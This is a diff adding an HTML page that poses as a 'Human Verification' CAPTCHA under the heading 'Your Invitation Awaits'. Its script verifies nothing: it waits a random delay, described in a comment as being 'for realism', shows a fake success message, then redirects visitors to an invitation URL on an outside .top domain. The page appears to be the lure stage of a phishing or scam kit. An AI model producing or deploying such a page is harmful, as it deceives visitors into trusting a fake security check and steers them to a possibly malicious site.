@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Security Verification</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    .container {
+      background: rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(10px);
+      border-radius: 20px;
+      padding: 40px;
+      max-width: 450px;
+      width: 100%;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+    }
+
+    h1 {
+      color: #ffffff;
+      text-align: center;
+      margin-bottom: 10px;
+      font-size: 24px;
+    }
+
+    .subtitle {
+      color: rgba(255, 255, 255, 0.6);
+      text-align: center;
+      margin-bottom: 30px;
+      font-size: 14px;
+    }
+
+    .verification-box {
+      background: rgba(255, 255, 255, 0.05);
+      border: 2px solid rgba(255, 255, 255, 0.1);
+      border-radius: 12px;
+      padding: 25px;
+      margin-bottom: 20px;
+    }
+
+    .verification-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+
+    .verification-icon {
+      width: 40px;
+      height: 40px;
+      background: linear-gradient(135deg, #4CAF50, #45a049);
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 20px;
+    }
+
+    .verification-text {
+      color: #ffffff;
+      font-size: 16px;
+      font-weight: 500;
+    }
+
+    .checkbox-container {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      padding: 15px;
+      background: rgba(255, 255, 255, 0.02);
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      border: 2px solid rgba(255, 255, 255, 0.05);
+    }
+
+    .checkbox-container:hover {
+      background: rgba(255, 255, 255, 0.05);
+      border-color: rgba(76, 175, 80, 0.3);
+    }
+
+    .checkbox-label {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      cursor: pointer;
+      flex: 1;
+    }
+
+    .custom-checkbox {
+      width: 24px;
+      height: 24px;
+      border: 2px solid rgba(255, 255, 255, 0.3);
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.3s ease;
+      background: rgba(255, 255, 255, 0.05);
+      position: relative;
+    }
+
+    .custom-checkbox.loading {
+      border-color: rgba(76, 175, 80, 0.5);
+    }
+
+    .custom-checkbox.checked {
+      background: linear-gradient(135deg, #4CAF50, #45a049);
+      border-color: #4CAF50;
+    }
+
+    .custom-checkbox.checked::after {
+      content: '✓';
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+    }
+
+    .loading-spinner {
+      display: none;
+      width: 20px;
+      height: 20px;
+      border: 2px solid rgba(76, 175, 80, 0.3);
+      border-top: 2px solid #4CAF50;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      position: absolute;
+      left: 32px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .checkbox-text {
+      color: rgba(255, 255, 255, 0.8);
+      font-size: 14px;
+    }
+
+    .status-text {
+      color: rgba(255, 255, 255, 0.4);
+      font-size: 12px;
+      text-align: center;
+      margin-top: 15px;
+    }
+
+    .done-btn {
+      width: 100%;
+      padding: 15px;
+      background: linear-gradient(135deg, #4CAF50, #45a049);
+      border: none;
+      border-radius: 12px;
+      color: white;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      margin-top: 20px;
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+
+    .done-btn.active {
+      opacity: 1;
+      cursor: pointer;
+    }
+
+    .done-btn.active:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 5px 20px rgba(76, 175, 80, 0.4);
+    }
+
+    .success-message {
+      display: none;
+      text-align: center;
+      color: #4CAF50;
+      font-size: 18px;
+      font-weight: 600;
+      margin-top: 20px;
+      padding: 20px;
+      background: rgba(76, 175, 80, 0.1);
+      border-radius: 12px;
+      border: 2px solid rgba(76, 175, 80, 0.3);
+    }
+
+    .warning-text {
+      color: #ff6b6b;
+      font-size: 12px;
+      text-align: center;
+      margin-top: 10px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Your Invitation Awaits</h1>
+    <p class="subtitle">Complete the verification to continue</p>
+    
+    <div class="verification-box">
+      <div class="verification-header">
+        <div class="verification-icon">✓</div>
+        <div class="verification-text">Human Verification Required</div>
+      </div>
+      
+      <label class="checkbox-container">
+        <div class="checkbox-label">
+          <div class="custom-checkbox" id="customCheckbox"></div>
+          <div class="loading-spinner" id="loadingSpinner"></div>
+          <span class="checkbox-text">I am not a robot</span>
+        </div>
+      </label>
+      
+      <p class="status-text">This helps us keep the platform secure</p>
+      <p class="warning-text" id="warningText">Please confirm you are not a robot first.</p>
+    </div>
+    
+    <button class="done-btn" id="doneBtn" disabled>Done</button>
+    
+    <div class="success-message" id="successMessage">
+      ✓ Verification successful! Redirecting...
+    </div>
+  </div>
+
+  <script>
+    const customCheckbox = document.getElementById('customCheckbox');
+    const loadingSpinner = document.getElementById('loadingSpinner');
+    const doneBtn = document.getElementById('doneBtn');
+    const successMessage = document.getElementById('successMessage');
+    const warningText = document.getElementById('warningText');
+
+    let isChecked = false;
+    let isLoading = false;
+
+    customCheckbox.addEventListener('click', function() {
+      if (isChecked || isLoading) return;
+      
+      isLoading = true;
+      customCheckbox.classList.add('loading');
+      loadingSpinner.style.display = 'flex';
+      
+      // Random verification delay between 2-5 seconds for realism
+      const randomDelay = Math.floor(Math.random() * 3000) + 2000;
+      
+      // Simulate verification delay (realistic CAPTCHA behavior)
+      setTimeout(() => {
+        isLoading = false;
+        loadingSpinner.style.display = 'none';
+        customCheckbox.classList.remove('loading');
+        customCheckbox.classList.add('checked');
+        isChecked = true;
+        
+        doneBtn.disabled = false;
+        doneBtn.classList.add('active');
+        warningText.style.display = 'none';
+      }, randomDelay);
+    });
+
+    doneBtn.addEventListener('click', function() {
+      if (!isChecked) {
+        warningText.style.display = 'block';
+        return;
+      }
+      
+      // Show success message
+      successMessage.style.display = 'block';
+      doneBtn.style.display = 'none';
+      
+      // Redirect to the specified URL after 2 seconds
+      setTimeout(() => {
+        window.location.href = 'https://joinus-invite.top/invitation/';
+      }, 2000);
+    });
+  </script>
+</body>
+</html>
